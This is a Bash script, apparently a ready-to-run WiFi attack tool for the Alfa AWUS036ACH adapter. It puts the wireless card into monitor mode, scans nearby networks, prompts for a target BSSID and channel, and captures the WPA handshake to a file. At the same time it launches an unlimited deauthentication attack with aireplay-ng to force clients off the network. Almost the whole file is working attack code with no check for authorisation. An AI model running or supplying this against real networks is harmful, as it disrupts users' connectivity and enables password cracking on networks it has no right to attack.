#!/bin/bash

# === ASCII Banner ===
echo -e "\e[1;32m
 __      __.__ _____.__   ___ ___        __   .__             
/  \\    /  \\__|/ ____\\__| /   |   \\_____  ____ |  | _|__| ____   ____ 
\\   \\/\\/   /  \\  __\\|  |/    ~    \\__  \\ _/ ___\\|  |/ /  |/    \\ / ___\\ 
 \\        /|  ||  |  |  |\\  Y  // __ \\\\  \\___|  <|  |  |  |\\/ /_/ >
  \\__/\\  / |__||__|  |__| \\___|_ /(____  /\\___  >__|_\\__|___| /\\___  / 
        \\/                      \\/      \\/     \\/     \\/        \\//_____/ 
      For Alfa Adapter AWUS036ACH (Realtek 88XXau)
\e[0m"

# === Colors ===
green()  { echo -e "\e[1;32m[+] $*\e[0m"; }
yellow() { echo -e "\e[1;33m[*] $*\e[0m"; }
red()    { echo -e "\e[1;31m[-] $*\e[0m"; }

# --- Load the 88XXau module ---
sudo modprobe 88XXau || { red "Failed to load 88XXau module. Exiting."; exit 1; }
green "88XXau module loaded."

# === Trap CTRL+C ===
# This ensures that if the script is interrupted, monitor mode is taken down.
trap 'red "Interrupted. Taking down monitor mode and exiting..."; sudo ip link set "$MONITOR_INTERFACE" down 2>/dev/null; sudo service network-manager start 2>/dev/null; exit 1' INT

# === Make sure wlan0 exists ===
if ! iw dev | grep -q wlan0; then
    red "wlan0 not found. Make sure your Alfa adapter is connected."
    exit 1
fi

# === Start monitor mode ===
yellow "Checking for interfering processes and starting monitor mode on wlan0..."
sudo airmon-ng check kill || yellow "No interfering processes found or none to kill."

# `airmon-ng start wlan0` will usually create a new interface like wlan0mon or mon0.
# We need to capture that name.
MONITOR_INTERFACE=$(sudo airmon-ng start wlan0 | grep "monitor mode enabled on" | awk '{print $NF}' | tr -d ')' || echo "wlan0mon")

if [ -z "$MONITOR_INTERFACE" ]; then
    red "Failed to determine monitor interface name. Attempting with 'wlan0mon'."
    MONITOR_INTERFACE="wlan0mon"
fi

if ! iw dev | grep -q "$MONITOR_INTERFACE"; then
    red "Failed to put wlan0 into monitor mode or monitor interface '$MONITOR_INTERFACE' not found. Exiting."
    # Attempt to restart network manager if monitor mode failed to start
    sudo service network-manager start 2>/dev/null
    exit 1
fi

green "$MONITOR_INTERFACE is now in monitor mode."

# === Start dumping (initial scan) ===
yellow "Starting airodump-ng to scan for networks. Press Ctrl+C when you have identified your target BSSID and Channel."
sudo airodump-ng "$MONITOR_INTERFACE"

# Read user input for BSSID and Channel
read -p "$(yellow "Enter the BSSID of the target network (e.g., AA:BB:CC:DD:EE:FF): ")" BSSID
read -p "$(yellow "Enter the Channel of the target network (e.g., 6): ")" Channel

# Basic input validation for BSSID and Channel (can be improved)
if [[ ! "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ ]]; then
    red "Invalid BSSID format. Exiting."
    sudo ip link set "$MONITOR_INTERFACE" down 2>/dev/null
    sudo service network-manager start 2>/dev/null
    exit 1
fi

if ! [[ "$Channel" =~ ^[0-9]+$ ]] || [ "$Channel" -le 0 ] || [ "$Channel" -gt 165 ]; then
    red "Invalid Channel. Exiting."
    sudo ip link set "$MONITOR_INTERFACE" down 2>/dev/null
    sudo service network-manager start 2>/dev/null
    exit 1
fi

# === Start dumping target network in a new terminal ===
green "Starting airodump-ng on channel $Channel for BSSID $BSSID in a new terminal. This will capture the handshake."
gnome-terminal -- bash -c "sudo airodump-ng -c $Channel --bssid $BSSID -w captures \"$MONITOR_INTERFACE\"; exec bash" &

# Give a moment for airodump-ng to start in the new terminal
sleep 5

# === Perform deauthentication attack ===
yellow "Performing deauthentication attack against $BSSID. This will continuously send deauth packets."
yellow "Press Ctrl+C in this terminal to stop the deauth attack and clean up."
sudo aireplay-ng --deauth 0 -a "$BSSID" "$MONITOR_INTERFACE"

# === Cleanup (after deauth attack is stopped) ===
green "Deauthentication attack stopped. Taking down monitor mode."
sudo ip link set "$MONITOR_INTERFACE" down 2>/dev/null
sudo service network-manager start 2>/dev/null
green "Cleanup complete. Network Manager restarted."

exit 0
